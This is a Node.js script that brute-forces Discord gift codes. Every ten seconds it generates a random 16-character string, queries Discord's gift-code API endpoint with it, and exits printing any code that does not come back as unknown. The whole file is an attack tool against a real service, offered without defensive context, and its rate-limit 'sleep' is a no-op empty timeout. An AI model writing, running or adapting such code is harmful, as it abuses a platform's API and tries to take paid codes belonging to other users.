const request = require('request');
const timers = require('timers');

function makeid(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

timers.setInterval(function () {
  var id = makeid(16)
  var uri = 'https://discord.com/api/v6/entitlements/gift-codes/' + id
  request(uri, { json: true }, (err, res, body) => {
    if (err) { return console.log(err); }
    if (body.message.includes ("Unknown")) {
      console.warn ("======> [ERR] " + id + " not valid.")
    } else if (body.message.includes ('rate')) {
      console.warn("======> [WARN] RATE LIMIT! SLEEPING")
      setTimeout(function () {return}, body.retry_after)
    }

    else {
      console.log("======> [RES] Possible resolution?")
      console.log ("======> [STACK TRACE] CODE: " + id)
      console.log (body);
      process.exit(22);
    }
  });
}, 10000)
